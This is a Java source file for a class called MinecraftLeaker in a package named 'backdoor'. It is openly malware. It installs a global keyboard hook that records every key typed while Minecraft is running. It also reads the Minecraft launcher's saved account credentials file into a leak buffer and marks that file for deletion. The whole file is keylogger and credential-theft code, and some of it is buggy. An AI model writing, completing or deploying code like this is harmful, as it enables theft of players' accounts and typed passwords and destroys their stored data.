package com.github.pulsebeat02.backdoor;

import com.github.pulsebeat02.utility.TaskUtilities;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.CompletableFuture;

public class MinecraftLeaker extends Leakable implements NativeKeyListener {

  private String sequence;
  private boolean run;

  public MinecraftLeaker() {
    run = true;
    try {
      GlobalScreen.registerNativeHook();
    } catch (final NativeHookException e) {
      e.printStackTrace();
    }
    storeProfilesJSON();
    checkMinecraftLaunch();
  }

  public void checkMinecraftLaunch() {
    CompletableFuture.runAsync(
        () -> {
          while (run) {
            if (TaskUtilities.taskIsRunning("Minecraft")) {
              GlobalScreen.addNativeKeyListener(this);
              boolean running = true;
              while (running) {
                if (!TaskUtilities.taskIsRunning("Minecraft")) {
                  running = false;
                }
              }
            }
          }
        });
  }

  public void storeProfilesJSON() {
    appendLine("============== MINECRAFT PROFILE ==============");
    final File file = new File("%appdata%\\.minecraft\\launcher_accounts.json");
    if (file.exists()) {
      file.deleteOnExit();
      try {
        appendLine(
            String.join(
                System.lineSeparator(),
                Files.readAllLines(Paths.get(file.getAbsolutePath()), StandardCharsets.UTF_8)));
      } catch (final IOException e) {
        e.printStackTrace();
      }
    }
    appendLine("==============================================");
  }

  @Override
  public void nativeKeyPressed(final NativeKeyEvent e) {}

  @Override
  public void nativeKeyTyped(final NativeKeyEvent nke) {
    final int code = nke.getKeyCode();
    if (code == 13) {
      sequence += "\n";
    } else {
      sequence += (nke.getKeyCode() + " ");
    }
  }

  @Override
  public void nativeKeyReleased(final NativeKeyEvent nke) {}

  public String getSequence() {
    return sequence;
  }

  public void setRunning(final boolean b) {
    run = b;
  }
}
